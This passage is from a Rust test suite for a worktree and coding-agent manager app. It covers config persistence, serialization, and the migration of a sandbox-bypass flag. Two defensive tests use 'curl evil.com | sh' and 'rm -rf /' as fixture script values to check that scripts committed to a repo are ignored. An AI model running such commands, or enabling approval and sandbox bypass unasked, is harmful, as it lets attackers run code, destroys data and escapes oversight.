                    persist_atomic(&target, &p).unwrap();
                }
            }));
        }
        for h in handles {
            h.join().unwrap();
        }

        // The final file must be exactly one writer's full, homogeneous payload.
        let content = fs::read(&*target).unwrap();
        assert_eq!(content.len(), 4096, "file truncated → temp-name collision");
        let byte = content[0];
        assert!(
            payloads.iter().any(|p| p[0] == byte),
            "file byte {byte} matches no writer"
        );
        assert!(
            content.iter().all(|&b| b == byte),
            "interleaved content → concurrent-write race"
        );

        // No temp files left behind by any writer.
        let leftovers: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().contains("tmp."))
            .collect();
        assert!(leftovers.is_empty(), "temp files leaked: {leftovers:?}");
    }

    #[cfg(unix)]
    #[test]
    fn save_json_config_sets_restrictive_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let dir = TempDir::new().unwrap();
        let filename = "perms-test.json";
        let target = dir.path().join(filename);

        let cfg = NotificationConfig::default();
        let json = serde_json::to_string_pretty(&cfg).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json).unwrap();

        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(&temp, perms).unwrap();
        fs::rename(&temp, &target).unwrap();

        let metadata = fs::metadata(&target).unwrap();
        let mode = metadata.permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "Config file should be owner-only (0600)");
    }

    #[test]
    fn has_custom_settings_true_when_base_branch_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("main".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_ignored_files() {
        let entry = RepoSettingsEntry {
            copy_ignored_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_untracked_files() {
        let entry = RepoSettingsEntry {
            copy_untracked_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_setup_script_set() {
        let entry = RepoSettingsEntry {
            setup_script: Some("npm install".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_run_script_set() {
        let entry = RepoSettingsEntry {
            run_script: Some("npm start".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_archive_script_set() {
        let entry = RepoSettingsEntry {
            archive_script: Some("cleanup.sh".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_color_set() {
        let entry = RepoSettingsEntry {
            color: "#ff0000".to_string(),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_multiple_fields_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            setup_script: Some("make build".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn invalid_split_tab_mode_fails_deserialization() {
        // An invalid split_tab_mode value should cause deserialization to fail,
        // which load_json_config handles by returning Default
        let json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null,"split_tab_mode":"bogus"}"#;
        let result: Result<AppConfig, _> = serde_json::from_str(json);
        assert!(
            result.is_err(),
            "Invalid split_tab_mode should fail deserialization"
        );
    }

    #[test]
    fn split_tab_mode_serializes_as_lowercase() {
        let cfg = AppConfig {
            split_tab_mode: SplitTabMode::Unified,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""split_tab_mode":"unified""#));

        let cfg2 = AppConfig::default();
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""split_tab_mode":"separate""#));
    }

    #[test]
    fn tab_ordering_mode_serializes_as_kebab_case() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""tab_ordering_mode":"terminals-first""#));

        let cfg2 = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""tab_ordering_mode":"free""#));

        let cfg3 = AppConfig::default();
        let json3 = serde_json::to_string(&cfg3).unwrap();
        assert!(json3.contains(r#""tab_ordering_mode":"grouped-by-type""#));
    }

    #[test]
    fn tab_ordering_mode_round_trip() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        let loaded: AppConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(loaded.tab_ordering_mode, TabOrderingMode::Free);
    }

    // Catches: a pre-migration backend save discards the marker and re-enables a removed bypass.
    #[test]
    #[serial_test::serial]
    fn codex_removed_bypass_survives_legacy_backend_save() {
        let dir = tempfile::tempdir_in(crate::test_support::test_temp_root()).unwrap();
        let _override = set_config_dir_override(dir.path().to_path_buf());
        let base = load_agents_config();
        let mut desired = base.clone();
        desired.agents.get_mut("codex").unwrap().run_configs[0]
            .args
            .clear();
        save_agents_config(base, desired).unwrap();

        // Baseline 33faf1183 AgentSettings has no codex_bypass_migrated field.
        // Its typed ConfigFile read-modify-write omits that unknown field even
        // when the user only changes idle-close. Record that on-disk result.
        let path = dir.path().join(AGENTS_CONFIG_FILE);
        let mut legacy_saved: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
        legacy_saved["agents"]["codex"]
            .as_object_mut()
            .unwrap()
            .remove("codex_bypass_migrated");
        legacy_saved["agents"]["codex"]["idle_close_minutes"] = serde_json::json!(30);
        persist_atomic(&path, &serde_json::to_vec(&legacy_saved).unwrap()).unwrap();

        let reloaded = load_agents_config();
        assert!(
            reloaded.agents["codex"].run_configs[0].args.is_empty(),
            "an unrelated save by an older backend must not reactivate sandbox bypass"
        );
    }

    #[test]
    #[serial_test::serial]
    fn codex_bypass_migration_does_not_restore_a_removed_flag() {
        // Catches: every load silently re-enabling bypass after Settings removes it.
        let dir = TempDir::new().unwrap();
        assert!(
            dir.path()
                .starts_with(crate::test_support::test_temp_root())
        );
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let base = load_agents_config();
        assert_eq!(
            base.agents["codex"].run_configs[0].args,
            vec!["--dangerously-bypass-approvals-and-sandbox"]
        );
        let mut desired = base.clone();
        desired.agents.get_mut("codex").unwrap().run_configs[0]
            .args
            .clear();
        save_agents_config(base, desired).unwrap();
        assert!(
            load_agents_config().agents["codex"].run_configs[0]
                .args
                .is_empty()
        );
        let disk: serde_json::Value =
            serde_json::from_slice(&fs::read(dir.path().join("agents.json")).unwrap()).unwrap();
        assert_eq!(
            disk["agents"]["codex"]["run_configs"][0]["args"],
            serde_json::json!([])
        );
    }

    #[test]
    #[serial_test::serial]
    fn codex_bypass_migration_preserves_wrappers_and_custom_configs() {
        // Catches: migration putting direct CLI flags before a wrapper subcommand,
        // or enabling bypass for a non-default authored config.
        for (command, expected) in [("codex", true), ("/opt/company/codex-wrapper", false)] {
            let dir = TempDir::new().unwrap();
            assert!(
                dir.path()
                    .starts_with(crate::test_support::test_temp_root())
            );
            let _guard = set_config_dir_override(dir.path().to_path_buf());
            fs::write(dir.path().join("agents.json"), serde_json::to_vec(&serde_json::json!({
                "agents": {"codex": {"run_configs": [
                    {"name":"Custom", "command":"codex", "args":["--search"]},
                    {"name":"Default", "command":command, "args":["--search"], "is_default":true}
                ]}}
            })).unwrap()).unwrap();
            let loaded = load_agents_config();
            let configs = &loaded.agents["codex"].run_configs;
            assert_eq!(configs[0].args, vec!["--search"]);
            assert_eq!(
                configs[1]
                    .args
                    .iter()
                    .any(|s| s == "--dangerously-bypass-approvals-and-sandbox"),
                expected,
                "{command}"
            );
            assert_eq!(
                load_agents_config().agents["codex"].run_configs[1].args,
                configs[1].args
            );
        }
    }

    #[test]
    fn agents_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut agents = AgentsConfig::default();
        let mut env = HashMap::new();
        env.insert("ANTHROPIC_API_KEY".to_string(), "sk-test".to_string());
        agents.agents.insert(
            "claude".to_string(),
            AgentSettings {
                run_configs: vec![
                    AgentRunConfig {
                        name: "Default".to_string(),
                        command: "claude".to_string(),
                        args: vec![],
                        model: None,
                        env: HashMap::new(),
                        is_default: true,
                    },
                    AgentRunConfig {
                        name: "Sonnet Print".to_string(),
                        command: "claude".to_string(),
                        args: vec![
                            "--model".to_string(),
                            "sonnet".to_string(),
                            "--print".to_string(),
                        ],
                        model: None,
                        env,
                        is_default: false,
                    },
                ],
                idle_close_minutes: DEFAULT_IDLE_CLOSE_MINUTES,
                codex_bypass_migrated: false,
                auto_retry_on_error: false,
                headless_template: None,
                env_flags: HashMap::new(),
                intent_tab_title: Some(false),
                suggest_followups: None,
                hook_instrumentation: None,
                native_status_signals: None,
                prevent_alt_screen: None,
                skip_trust_dialog: Some(false),
                ego_mode: None,
                ego_sandbox: None,
                progress_tracking: Some(false),
            },
        );
        let loaded: AgentsConfig = round_trip_in_dir(dir.path(), "agents.json", &agents);
        assert_eq!(loaded.agents.len(), 1);
        let claude = loaded.agents.get("claude").unwrap();
        assert_eq!(claude.skip_trust_dialog, Some(false));
        assert_eq!(claude.run_configs.len(), 2);
        assert_eq!(claude.run_configs[0].name, "Default");
        assert!(claude.run_configs[0].is_default);
        assert_eq!(claude.run_configs[1].name, "Sonnet Print");
        assert_eq!(
            claude.run_configs[1].args,
            vec!["--model", "sonnet", "--print"]
        );
        assert_eq!(
            claude.run_configs[1].env.get("ANTHROPIC_API_KEY").unwrap(),
            "sk-test"
        );
        assert!(!claude.run_configs[1].is_default);
        assert_eq!(claude.intent_tab_title, Some(false));
        assert_eq!(claude.suggest_followups, None);
        assert_eq!(claude.progress_tracking, Some(false));
    }

    #[test]
    fn run_config_model_survives_config_round_trip_without_rewriting_legacy_args() {
        let original = serde_json::json!({
            "agents": {"claude": {"run_configs": [
                {"name": "Structured", "command": "claude", "args": [], "model": "sonnet"},
                {"name": "Legacy", "command": "claude", "args": ["--model", "opus"]}
            ]}}
        });
        let parsed: AgentsConfig = serde_json::from_value(original).unwrap();
        let saved = serde_json::to_value(parsed).unwrap();
        let configs = &saved["agents"]["claude"]["run_configs"];
        assert_eq!(configs[0]["model"], "sonnet");
        assert_eq!(configs[1]["args"], serde_json::json!(["--model", "opus"]));
    }

    #[test]
    fn agents_config_missing_file_returns_default() {
        let cfg: AgentsConfig = load_json_config("nonexistent-agents-12345.json");
        assert!(cfg.agents.is_empty());
    }

    // -- Worktree config tests --

    #[test]
    fn worktree_enums_serialize_as_expected() {
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::Sibling).unwrap(),
            r#""sibling""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::AppDir).unwrap(),
            r#""app-dir""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::InsideRepo).unwrap(),
            r#""inside-repo""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::ClaudeCodeDefault).unwrap(),
            r#""claude-code-default""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::On).unwrap(),
            r#""on""#
        );
        assert_eq!(
            serde_json::to_string(&MergeStrategy::Squash).unwrap(),
            r#""squash""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Archive).unwrap(),
            r#""archive""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Delete).unwrap(),
            r#""delete""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Off).unwrap(),
            r#""off""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Auto).unwrap(),
            r#""auto""#
        );
    }

    #[test]
    fn worktree_enums_deserialize() {
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""sibling""#).unwrap(),
            WorktreeStorage::Sibling
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""app-dir""#).unwrap(),
            WorktreeStorage::AppDir
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""inside-repo""#).unwrap(),
            WorktreeStorage::InsideRepo
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""claude-code-default""#).unwrap(),
            WorktreeStorage::ClaudeCodeDefault
        );
        assert_eq!(
            serde_json::from_str::<OrphanCleanup>(r#""ask""#).unwrap(),
            OrphanCleanup::Ask
        );
        assert_eq!(
            serde_json::from_str::<MergeStrategy>(r#""rebase""#).unwrap(),
            MergeStrategy::Rebase
        );
        assert_eq!(
            serde_json::from_str::<WorktreeAfterMerge>(r#""ask""#).unwrap(),
            WorktreeAfterMerge::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""off""#).unwrap(),
            AutoDeleteOnPrClose::Off
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""ask""#).unwrap(),
            AutoDeleteOnPrClose::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""auto""#).unwrap(),
            AutoDeleteOnPrClose::Auto
        );
    }

    #[test]
    fn repo_defaults_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = RepoDefaultsConfig {
            worktree_storage: WorktreeStorage::InsideRepo,
            prompt_on_create: false,
            delete_branch_on_remove: false,
            auto_archive_merged: true,
            orphan_cleanup: OrphanCleanup::On,
            pr_merge_strategy: MergeStrategy::Squash,
            after_merge: WorktreeAfterMerge::Delete,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::Auto,
            ..RepoDefaultsConfig::default()
        };
        let loaded: RepoDefaultsConfig = round_trip_in_dir(dir.path(), "repo-defaults.json", &cfg);
        assert_eq!(loaded.worktree_storage, WorktreeStorage::InsideRepo);
        assert!(!loaded.prompt_on_create);
        assert!(!loaded.delete_branch_on_remove);
        assert!(loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::On);
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Delete);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Auto);
    }

    #[test]
    fn repo_defaults_serde_default_for_worktree_fields() {
        // Old config without worktree fields should deserialize with defaults
        let json = r#"{"base_branch":"automatic","copy_ignored_files":false}"#;
        let loaded: RepoDefaultsConfig = serde_json::from_str(json).unwrap();
        assert_eq!(loaded.worktree_storage, WorktreeStorage::Sibling);
        assert!(loaded.prompt_on_create);
        assert!(loaded.delete_branch_on_remove);
        assert!(!loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::Ask);
        // squash is the global default; old configs without the field inherit it
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Archive);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Off);
    }

    #[test]
    fn orphan_cleanup_countdown_setting_round_trips_and_defaults_to_ten_seconds() {
        let configured: RepoDefaultsConfig = serde_json::from_value(serde_json::json!({
            "orphan_cleanup_countdown_seconds": 20
        }))
        .unwrap();
        let serialized = serde_json::to_value(configured).unwrap();
        assert_eq!(serialized["orphan_cleanup_countdown_seconds"], 20);

        let defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        let serialized_defaults = serde_json::to_value(defaults).unwrap();
        assert_eq!(serialized_defaults["orphan_cleanup_countdown_seconds"], 10);
    }

    #[test]
    fn repo_settings_entry_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                worktree_storage: Some(WorktreeStorage::AppDir),
                prompt_on_create: Some(false),
                delete_branch_on_remove: Some(false),
                auto_archive_merged: Some(true),
                orphan_cleanup: Some(OrphanCleanup::Off),
                pr_merge_strategy: Some(MergeStrategy::Rebase),
                after_merge: Some(WorktreeAfterMerge::Ask),
                auto_delete_on_pr_close: Some(AutoDeleteOnPrClose::Ask),
                ..RepoSettingsEntry::default()
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.worktree_storage, Some(WorktreeStorage::AppDir));
        assert_eq!(entry.prompt_on_create, Some(false));
        assert_eq!(entry.delete_branch_on_remove, Some(false));
        assert_eq!(entry.auto_archive_merged, Some(true));
        assert_eq!(entry.orphan_cleanup, Some(OrphanCleanup::Off));
        assert_eq!(entry.pr_merge_strategy, Some(MergeStrategy::Rebase));
        assert_eq!(entry.after_merge, Some(WorktreeAfterMerge::Ask));
        assert_eq!(
            entry.auto_delete_on_pr_close,
            Some(AutoDeleteOnPrClose::Ask)
        );
    }

    #[test]
    fn repo_settings_entry_null_worktree_fields() {
        // Old repo settings without worktree fields should have None
        let json = r#"{"path":"/my/repo","display_name":"test","base_branch":"main"}"#;
        let entry: RepoSettingsEntry = serde_json::from_str(json).unwrap();
        assert_eq!(entry.worktree_storage, None);
        assert_eq!(entry.prompt_on_create, None);
        assert_eq!(entry.delete_branch_on_remove, None);
        assert_eq!(entry.orphan_cleanup, None);
    }

    #[test]
    fn dev_server_url_round_trips_without_changing_older_repo_settings() {
        let old: RepoSettingsEntry = serde_json::from_str(r#"{"path":"/my/repo"}"#).unwrap();
        assert_eq!(old.dev_server_url, None);
        assert!(!old.has_custom_settings());
        let configured = RepoSettingsEntry {
            path: "/my/repo".into(),
            dev_server_url: Some("http://localhost:5173".into()),
            ..Default::default()
        };
        assert!(configured.has_custom_settings());
        let json = serde_json::to_string(&configured).unwrap();
        let loaded: RepoSettingsEntry = serde_json::from_str(&json).unwrap();
        assert_eq!(
            loaded.dev_server_url.as_deref(),
            Some("http://localhost:5173")
        );
    }

    #[test]
    fn has_custom_settings_true_when_worktree_storage_set() {
        let entry = RepoSettingsEntry {
            worktree_storage: Some(WorktreeStorage::InsideRepo),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_prompt_on_create_set() {
        let entry = RepoSettingsEntry {
            prompt_on_create: Some(false),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    // -- Note image tests --
    // These tests use the global config_dir override and must run serially.

    /// The broadcast is driven by this flag, so a wrong `false` silently leaves
    /// every other client on a stale baseline — the exact failure the event exists
    /// to end.
    #[test]
    #[serial_test::serial]
    fn a_delta_that_moves_the_document_reports_changed() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let changed = save_repositories_request(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/repo",
                "before": null,
                "after": {"path": "/repo", "displayName": "Repo", "branches": {}}
            }],
            "groups": []
        }))
        .expect("first write");

        assert!(changed, "creating a repo moves the document");
    }

    /// Re-applying a delta is a no-op on disk. Announcing it anyway would make
    /// every save wake every client, whether or not anything moved.
    #[test]
    #[serial_test::serial]
    fn a_delta_already_applied_reports_unchanged() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let after = serde_json::json!({"path": "/repo", "displayName": "Repo", "branches": {}});
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/repo": after.clone()},
            "repoOrder": ["/repo"]
        }))
        .expect("seed repositories");

        let changed = save_repositories_request(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id": "/repo", "before": after.clone(), "after": after}],
            "groups": []
        }))
        .expect("idempotent write");

        assert!(!changed, "an already-applied delta must not be announced");
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_creates_file() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // A minimal valid PNG (1x1 pixel)
        let png_bytes: &[u8] = &[
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE,
        ];
        let b64 = general_purpose::STANDARD.encode(png_bytes);

        let result = save_note_image("test-note-1".to_string(), b64, "png".to_string());
        assert!(
            result.is_ok(),
            "save_note_image should succeed: {:?}",
            result
        );

        let path = std::path::PathBuf::from(result.unwrap());
        assert!(path.exists(), "Image file should exist on disk");
        assert!(
            crate::test_support::slashed(&path.to_string_lossy())
                .contains("note-images/test-note-1/")
        );
        assert!(path.to_string_lossy().ends_with(".png"));

        // Verify content matches
        let saved = fs::read(&path).unwrap();
        assert_eq!(saved, png_bytes);
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_oversized() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create data slightly over 10 MB
        let big_data = vec![0u8; MAX_IMAGE_SIZE + 1];
        let b64 = general_purpose::STANDARD.encode(&big_data);

        let result = save_note_image("test-note-big".to_string(), b64, "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too large"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_invalid_base64() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image(
            "test-note-bad".to_string(),
            "not-valid-base64!!!@@@".to_string(),
            "png".to_string(),
        );
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Invalid base64"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_path_traversal() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image("../etc".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("invalid characters"));

        let result2 = save_note_image("foo/bar".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result2.is_err());
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_removes_directory() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create a note-images dir with files
        let note_dir = dir.path().join("note-images").join("note-to-delete");
        fs::create_dir_all(&note_dir).unwrap();
        fs::write(note_dir.join("img1.png"), b"fake-png").unwrap();
        fs::write(note_dir.join("img2.png"), b"fake-png-2").unwrap();
        assert!(note_dir.exists());

        let result = delete_note_assets("note-to-delete".to_string());
        assert!(result.is_ok());
        assert!(!note_dir.exists(), "Directory should be removed");
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_noop_when_missing() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = delete_note_assets("nonexistent-note".to_string());
        assert!(result.is_ok(), "Should succeed even if dir doesn't exist");
    }

    #[test]
    fn repo_local_config_loads_valid_json() {
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "delete_branch_on_remove": false,
            "pr_merge_strategy": "squash"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();

        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        assert_eq!(config.delete_branch_on_remove, Some(false));
        assert_eq!(config.pr_merge_strategy, Some(MergeStrategy::Squash));
        assert!(config.copy_ignored_files.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_when_missing() {
        let dir = TempDir::new().unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_for_malformed_json() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "not valid json {{{").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_handles_empty_object() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "{}").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert!(config.base_branch.is_none());
    }

    #[test]
    fn repo_local_config_ignores_unknown_fields() {
        let dir = TempDir::new().unwrap();
        let json = r#"{"base_branch": "main", "unknown_field": 42}"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        assert_eq!(config.unwrap().base_branch.as_deref(), Some("main"));
    }

    #[test]
    fn repo_local_config_ignores_script_fields() {
        // Script fields (setup_script, run_script, archive_script) were intentionally
        // removed from RepoLocalConfig to prevent executing repo-committed scripts
        // without TOFU confirmation. Verify they are silently ignored.
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "setup_script": "curl evil.com | sh",
            "run_script": "rm -rf /",
            "archive_script": "echo pwned"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(
            config.is_some(),
            "config should parse despite unknown script fields"
        );
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        // RepoLocalConfig has no script fields — they are silently dropped by serde
        // No field to assert on; the fact that parsing succeeds without script
        // fields on the struct is the security guarantee.
    }

    #[test]
    fn overlay_repo_local_config_copies_set_fields_preserves_rest() {
        // base already has a value the per-repo entry leaves as inherit (None)
        let base = RepoLocalConfig {
            mcp_upstreams: Some(vec!["github".to_string()]),
            after_merge: Some(WorktreeAfterMerge::Delete),
            ..RepoLocalConfig::default()
        };
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            copy_ignored_files: Some(true),
            pr_merge_strategy: Some(MergeStrategy::Squash),
            // after_merge left None → must NOT clobber base's value
            ..RepoSettingsEntry::default()
        };

        let merged = overlay_repo_local_config(base, &entry);
        // explicit overrides copied
        assert_eq!(merged.base_branch.as_deref(), Some("develop"));
        assert_eq!(merged.copy_ignored_files, Some(true));
        assert_eq!(merged.pr_merge_strategy, Some(MergeStrategy::Squash));
        // inherit (None) preserved existing base values
        assert_eq!(merged.after_merge, Some(WorktreeAfterMerge::Delete));
        assert_eq!(
            merged.mcp_upstreams.as_deref(),
            Some(&["github".to_string()][..])
        );
        // untouched field stays None
        assert!(merged.copy_untracked_files.is_none());
    }

    #[test]
    fn overlay_repo_local_config_never_includes_scripts() {
        // RepoSettingsEntry carries script overrides, but RepoLocalConfig has no
        // script fields — verify the serialized .tuic.json can never leak them.
        let entry = RepoSettingsEntry {
            base_branch: Some("main".to_string()),
            setup_script: Some("curl evil.com | sh".to_string()),
            run_script: Some("rm -rf /".to_string()),
            ..RepoSettingsEntry::default()
        };
        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
        let json = serde_json::to_string(&merged).unwrap();
        assert!(json.contains("base_branch"));
        assert!(!json.contains("setup_script"));
        assert!(!json.contains("run_script"));
        assert!(!json.contains("evil.com"));
    }

    #[test]
    fn repo_local_config_serializes_sparsely() {
        // Only explicitly-set fields are written; inherit (None) fields are omitted
        // so the committed .tuic.json stays minimal.
        let cfg = RepoLocalConfig {
            base_branch: Some("develop".to_string()),
            ..RepoLocalConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert_eq!(json, r#"{"base_branch":"develop"}"#);
    }

    #[test]
    fn overlay_then_roundtrip_through_tuic_json() {
        let dir = TempDir::new().unwrap();
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            delete_branch_on_remove: Some(false),
            ..RepoSettingsEntry::default()
        };
        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
        let json = serde_json::to_string_pretty(&merged).unwrap();
        fs::write(dir.path().join(".tuic.json"), json).unwrap();

        let reloaded = load_repo_local_config_from_path(dir.path()).unwrap();
        assert_eq!(reloaded.base_branch.as_deref(), Some("develop"));
        assert_eq!(reloaded.delete_branch_on_remove, Some(false));
        assert!(reloaded.copy_ignored_files.is_none());
    }

    #[test]
    fn fill_repo_local_defaults_populates_empty_config() {
        // Regression: a user who relies on global defaults (no per-repo overrides)
        // must NOT get an empty {} .tuic.json — the export captures the effective
        // worktree/branch settings sourced from the global defaults.
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();
        defaults.copy_ignored_files = true;
        defaults.delete_branch_on_remove = false;

        let filled = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
        assert_eq!(filled.base_branch.as_deref(), Some("develop"));
        assert_eq!(filled.copy_ignored_files, Some(true));
        assert_eq!(filled.delete_branch_on_remove, Some(false));
        assert!(filled.worktree_storage.is_some());
        assert!(filled.pr_merge_strategy.is_some());

        let json = serde_json::to_string(&filled).unwrap();
        assert_ne!(json, "{}", "exported config must not be empty");
        assert!(json.contains("base_branch"));
    }

    #[test]
    fn fill_repo_local_defaults_preserves_existing_and_skips_mcp() {
